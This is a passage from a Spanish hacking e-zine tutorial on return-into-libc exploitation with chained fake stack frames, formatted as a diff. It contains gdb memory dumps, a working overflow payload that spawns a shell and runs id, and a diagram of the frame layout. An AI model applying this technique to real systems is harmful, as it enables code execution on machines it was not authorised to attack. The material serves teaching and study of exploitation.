+// 4to FRAME                      "ENDF"          &exit
+0xbffff130:	0x43434343	0x46444e45	0xb7ea2fb0	0x41414141
+0xbffff140:	0x41414141	0x41414141
+
+(gdb) c
+Continuing.
+Hello,           ?<   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAA       ?    BBBBBBBBBBBBBBBBBBBB4       ?<   CCCCCCCCCCCCCCCCCCCCCCC
+CCCCCCCCCENDF   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA    ?
+
+uid=1000(blackngel) gid=1000(blackngel) grupos=4(adm),20(dialout),24(cdrom),
+25(floppy),29(audio),30(dip),33(www-data),44(video),46(plugdev),104(scanner),
+108(lpadmin),110(admin),115(netdev),117(powerdev),1000(blackngel),1001(compiler)
+
+sh-3.2$ SET E-ZINE
+sh: SET: orden no encontrada
+sh-3.2$ exit
+exit
+
+uid=1000(blackngel) gid=1000(blackngel) grupos=4(adm),20(dialout),24(cdrom),
+25(floppy),29(audio),30(dip),33(www-data),44(video),46(plugdev),104(scanner),
+108(lpadmin),110(admin),115(netdev),117(powerdev),1000(blackngel),1001(compiler)
+
+Program exited with code 0101.
+(gdb) 
+ 
+Consguido! Puede parecer bastante complicado, pero si miras un par de veces
+(detenidamente), el examen de la memoria, no tardaras en comprender la bella
+estructura. En realidad es lo que Nergal nos indicaba con su grafico. Mas o
+menos asi:
+
+                            EBP          EIP
+           [ ....... ] [ fake_ebp0 ] [ &leave;ret; ] [ ....... ]    FRAME 0
+                             |
+       +---------------------+
+       | FRAME 1
+       v
+ [ fake_ebp1 ][ system() ][ &leave;ret; ] [ &/usr/bin/id ] [ ARGS O RELLENO ]                    
+       |
+       +-+
+         | FRAME 2
+         v
+   [ fake_ebp2 ][ system() ][ &leave;ret; ][[ &/bin/sh ] [ ARGS O RELLENO ]
+         |                   
+       +-+
+       |   FRAME 3
+       v
+ [ fake_ebp3 ][ system() ][ &leave;ret; ] [ &/usr/bin/id ] [ ARGS O RELLENO ]
+       |
+       +---------------------+
+                             |
+           FRAME 4       [ RAND ][ exit() ][ RAND ][ ARG1 ] [ RELLENO ]
+
+
+Para que esta tecnica tenga exito, solo un aspecto obvio tiene que ser tenido
+en cuenta, y es que debemos tener cuidado de que ninguna de las direcciones
+contenga bytes NULL, en cuyo caso el paquete se cortaria en ese punto.
+
+Para terminar, por mencionar una curiosidad con respecto a tecnicas Return Into
+To Libc, decir que en el articulo "Non eXecutable Stack Loving on Mac OS X86",
+escrito y publicado pro KF, se mostraba una metodo en el que la funcion de la
+libreria del sistema que era llamada, en vez de algo como system() resultaba ser
+mprotect(), que precisamente marcaba la pila como ejecutable antes de retornar
+dentro de esta.
+
+
+
+---[ 5 - Conclusion
+
+Una vez llegados a este punto, no es que le hayamos sacado todo el jugo al
+articulo o mas especificamente a la tecnica Ret2Libc en cuestion. Pero ello
+deberia ser suficiente como para echar a volar tu imaginacion y realizar tus
+propias pruebas.
+
+Recomiendo altamente el estudio de la tecnica de falsos frames, presentada en
+un primer momento por Nergal en su articulo de Phrack. Aqui hemos tenido la
+valentia de desarrollarla de un modo practico.
+
+Return Into To Libc no es la panacea, pero recuerda nuevamente que puede serte
+muy util cuando te enfrentes ante un esquema de proteccion de memoria de pila
+no ejecutable.
+
+
+Feliz Hacking!
+
+Un abrazo!
+blackngel
+
+
+
+---[ 6 - Referencias
+
+ [1] Bypassing non-executable-stack during exploitation using return-to-libc
+     http://www.infosecwriters.com/text_resources/pdf/return-to-libc.pdf
+
+ [2] The advanced return-into-lib(c) exploits: PaX case study
+     http://www.phrack.org/issues.html?issue=58&id=4#article
+
+
+*EOF*
